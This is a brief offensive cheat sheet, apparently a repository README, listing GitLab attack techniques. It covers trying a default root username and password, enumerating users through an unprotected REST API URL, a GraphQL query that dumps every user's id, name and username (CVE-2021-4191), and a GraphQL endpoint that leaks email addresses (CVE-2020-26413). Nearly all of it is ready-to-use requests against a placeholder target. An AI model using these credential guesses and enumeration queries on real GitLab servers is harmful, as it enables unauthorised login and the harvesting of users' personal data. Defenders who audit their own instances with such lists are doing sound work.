# Gitlab-CVE
a Curated list of gitlab vulnerability

## gitlab weak login [high]
sometiem we can login to gitlab with default username & password like
```
[username=root,password=123456789]
```

## gitlab api user enum [medium]
we can enum user from unprotected api call
```
http://target.com/api/v4/users/1
```



## CVE-2021-4191 [medium]
Private GitLab instances with restricted sign-ups may be vulnerable to user enumeration to unauthenticated users through the GraphQL API.
```
http://target.com/api/graphql [root,support-bot,alert-bot]
```
we can enum all gitlab user

```
query { 
  users { 
    nodes {  
      id  
      name 
      username                      
    } 
  }
}
```

## CVE-2020-26413 [medium]
Information disclosure via GraphQL results in user email being unexpectedly visible.
```
http://target.com/api/graphql [test@gmail.com]
```

